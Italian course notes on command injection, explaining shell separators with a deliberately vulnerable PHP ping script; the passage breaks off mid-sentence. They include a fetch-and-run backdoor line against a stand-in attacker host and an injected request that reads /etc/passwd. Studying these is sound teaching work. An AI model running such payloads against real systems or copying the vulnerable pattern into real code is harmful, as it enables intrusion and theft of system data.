preso da [[4 - CS Applitcation Level - Sintesi Web Security Part I]]
# Command Injection
![[Pasted image 20251117145401.png]]

### Command Injection in sintesi

La **Command Injection** si verifica quando un'applicazione passa dati non sicuri (forniti dall'utente) a una shell di sistema. Un attaccante può usare questo difetto per eseguire comandi arbitrari del sistema operativo con i privilegi del server web.

- **Impatto:** Spesso porta alla compromissione totale del sistema (Full System Control), accesso ai dati sensibili, movimento laterale nella rete locale.
    
- **Esempio classico:** `$(curl https://web-attacker.com/backdoor.sh | sh)` (scarica ed esegue una backdoor).
    

### Attacchi di Command Injection

Molti linguaggi offrono funzioni per eseguire comandi di sistema (es. system(), exec(), passthru(), shell_exec() in PHP, o os.system() in Python).

Queste funzioni avviano una shell (come /bin/sh o cmd.exe) per elaborare il comando.

**Esempio vulnerabile (`ping.php`):**

```php
<?php
// Vulnerabilità: concatenazione diretta dell'input utente in un comando shell
system("ping -c 4 " . $_GET["ip"] . " -i 1");
?>
```

#### Uso Previsto

Richiesta: GET /ping.php?ip=8.8.8.8

Comando eseguito: ping -c 4 8.8.8.8 -i 1

Risultato: Output standard del comando ping.
![[Pasted image 20251117145644.png]]

#### L'Attacco

Un attaccante può usare **separatori di comandi** della shell per iniettare comandi aggiuntivi.

- Separatori comuni: `;` (esegue in sequenza), `&&` (esegue se il precedente ha successo), `||` (esegue se il precedente fallisce), `|` (pipe), `$` o `` ` `` (sostituzione di comando), e il carattere newline `\n` (`%0a` in URL encoding).
    

Richiesta: `GET /ping.php?ip=8.8.8.8;cat+/etc/passwd+#`

- `;`: Termina il comando `ping`.
    
- `cat /etc/passwd`: Nuovo comando iniettato.
    
- #: Commenta il resto del comando originale ( -i 1) per evitare errori di sintassi.
    
    Comando eseguito: ping -c 4 8.8.8.8; cat /etc/passwd # -i 1
![[Pasted image 20251117145701.png]]
Command Injection può essere anche fixato (anche qui) inserendo dei permessi in base al gruppo di appartenenza. Come
